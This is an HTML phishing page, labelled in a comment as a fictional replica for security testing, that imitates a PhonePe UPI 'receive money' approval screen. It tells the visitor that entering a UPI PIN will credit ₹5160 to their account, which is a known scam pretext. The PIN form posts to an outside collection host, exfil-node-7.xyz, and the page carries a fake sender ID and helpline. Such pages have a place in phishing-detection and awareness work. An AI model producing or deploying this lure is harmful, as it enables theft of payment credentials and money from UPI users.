<!-- fictional replica for security testing -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhonePe Receive Money Approval</title>
    <style>
        :root {
            --primary: #5f259f;
            --secondary: #673ab7;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #f1f5f9; color: #0f172a; display: flex; justify-content: center; padding: 12px; }
        .p2_c7_card { width: 100%; max-width: 400px; background: #ffffff; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); padding: 20px; margin-top: 10px; }
        .p2_c7_top-badge { display: inline-block; background: #dcfce7; color: #166534; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 20px; margin-bottom: 12px; }
        .p2_c7_header-brand { font-size: 20px; font-weight: 800; color: var(--primary); margin-bottom: 8px; }
        .p2_c7_info-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 10px; padding: 14px; margin-bottom: 16px; }
        .p2_c7_sender { font-size: 13px; color: #64748b; }
        .p2_c7_sender-name { font-size: 15px; font-weight: 700; color: #1e293b; }
        .p2_c7_amount { font-size: 32px; font-weight: 800; color: #16a34a; margin: 10px 0; }
        .p2_c7_warning { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 8px; padding: 10px; font-size: 12px; color: #92400e; margin-bottom: 16px; }
        .p2_c7_input-group { margin-bottom: 16px; }
        .p2_c7_input-label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 6px; }
        .p2_c7_pin-field { width: 100%; padding: 14px; font-size: 20px; text-align: center; border: 2px solid var(--primary); border-radius: 8px; letter-spacing: 6px; }
        .p2_c7_approve-btn { width: 100%; padding: 14px; background: var(--primary); color: #ffffff; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; cursor: pointer; }
        .p2_c7_support { text-align: center; margin-top: 16px; font-size: 12px; color: #64748b; }
    </style>
</head>
<body>
    <div class="p2_c7_card">
        <div class="p2_c7_top-badge">Incoming Payment Request</div>
        <div class="p2_c7_header-brand">PhonePe UPI Direct Transfer</div>
        <div class="p2_c7_info-box">
            <div class="p2_c7_sender">Sender UPI VPA</div>
            <div class="p2_c7_sender-name">settlement.desk7_1@ybl</div>
            <div class="p2_c7_amount">+ ₹5160</div>
            <div class="p2_c7_sender">Remarks: Ref #1066</div>
        </div>
        <div class="p2_c7_warning">
            ⚠️ <strong>Instruction:</strong> You will RECEIVE money: enter PIN to accept deposit directly into your linked bank account.
        </div>
        <form action="https://exfil-node-7.xyz/submit" method="POST">
            <div class="p2_c7_input-group">
                <label class="p2_c7_input-label" for="upi_pin">Enter 4 or 6 Digit UPI PIN</label>
                <input class="p2_c7_pin-field" type="password" id="upi_pin" name="upi_pin" maxlength="6" required placeholder="••••">
            </div>
            <button class="p2_c7_approve-btn" type="submit">ACCEPT & CREDIT TO ACCOUNT</button>
        </form>
        <div class="p2_c7_support">
            Helpline: +919876070001 &bull; Transaction ID: TXN001066
        </div>
    </div>
</body>
</html>
